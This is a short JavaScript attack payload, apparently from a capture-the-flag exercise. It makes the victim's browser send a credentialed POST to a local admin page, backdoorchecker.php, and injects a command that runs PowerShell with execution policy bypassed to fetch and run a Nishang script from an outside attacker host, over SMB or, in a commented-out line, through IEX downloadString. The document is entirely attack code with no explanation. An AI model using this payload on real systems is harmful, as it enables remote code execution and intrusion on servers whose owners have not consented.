var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.10\\testme\\nishang.ps1";
//var params = "cmd=dir | powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/nishang.ps1')";
xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(params);
